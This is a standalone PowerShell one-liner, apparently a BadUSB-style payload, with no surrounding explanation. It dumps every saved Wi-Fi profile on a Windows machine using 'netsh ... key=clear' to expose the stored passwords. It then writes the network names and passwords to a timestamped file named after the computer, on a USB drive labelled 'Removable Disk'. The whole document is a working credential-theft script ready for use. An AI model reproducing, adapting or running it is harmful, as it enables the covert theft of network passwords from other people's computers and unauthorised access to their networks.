$LABEL_NAME="Removable Disk";netsh wlan show profile|?{$_ -match": (.+)$"}|%{$ssid=$matches[1].Trim();$profileDetails=netsh wlan show profile name="$ssid" key=clear|Out-String;$capture=$false;$capturedNetworks=@();$pass="";$profileDetails -split"`r`n"|%{if(!$capture -and$_.Trim()-match"^-----------------$"){$capture=$true;}elseif($capture -and$_.Trim()-match"^$"){$capture=$false;$capturedNetworks+="${ssid}:${pass}";}elseif($capture){$pass=$_.Split(":")[1].Trim();}};$capturedNetworks -join"`n";}|Out-File -FilePath "$((gwmi -Class Win32_LogicalDisk|?{$_.VolumeName -EQ"$LABEL_NAME"}|select -ExpandProperty Name).Trim())\${env:ComputerName}_$(((Get-Date -UFormat "%s")-replace',', '.')).txt"
